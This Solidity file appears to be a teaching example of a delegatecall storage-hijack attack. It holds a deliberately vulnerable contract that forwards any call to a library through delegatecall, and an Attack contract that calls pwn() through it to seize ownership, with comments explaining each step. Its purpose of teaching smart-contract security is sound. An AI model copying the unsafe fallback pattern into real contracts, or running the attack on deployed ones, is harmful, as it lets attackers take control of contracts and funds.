// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./console.sol";

/*
HackMe is a contract that uses delegatecall to execute code.
It it is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        console.log("Lib.pwn() called");
        console.log("    Owner of Lib before assignment is %s", owner);
        owner = msg.sender;
        console.log("    Owner of Lib after assignment is now %s", owner);
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
        console.log("HackMe.constructor(), owner is %s", owner);
    }

    /*
    Creating a pwn() function inside HackMe may avoid the fallback()
    but the call to delegatecall will still call pwn() inside Lib to change the owner
    
    function pwn() public {
        console.log("HackMe.pwn()");
        console.log("  Owner of HackMe before delegate call is %s", owner);
        address(lib).delegatecall(msg.data);
        console.log("  Owner of HackMe after delegate call is %s", owner);
    }
    */
    fallback() external payable {
        console.log("HackMe.fallback() called, msg.data is ");
        console.logBytes(msg.data);
        console.log("  Owner of HackMe before delegate call is %s", owner);
        address(lib).delegatecall(msg.data);
        console.log("  Owner of HackMe after delegate call is %s", owner);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        console.log(
            "In Attack.attack(), call hackMe.call(abi.encodeWithSignature('pwn()'));"
        );
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
